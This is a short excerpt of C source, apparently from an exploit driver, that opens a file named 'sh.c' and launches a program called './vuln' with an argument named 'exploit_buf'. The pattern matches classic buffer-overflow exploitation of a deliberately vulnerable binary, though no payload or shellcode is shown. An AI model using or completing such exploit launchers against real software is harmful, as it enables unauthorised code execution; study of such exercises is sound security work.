   126          {
   127                  if((fp=fopen(&quot;sh.c&quot;,&quot;r&quot;))==NULL)
   128                  {
   129  //                      break;
   130                  }
   131  //              if((pid=fork())==0)
   132                  {
   133                          execl(&quot;./vuln&quot;,&quot;vuln&quot;,exploit_buf,0);
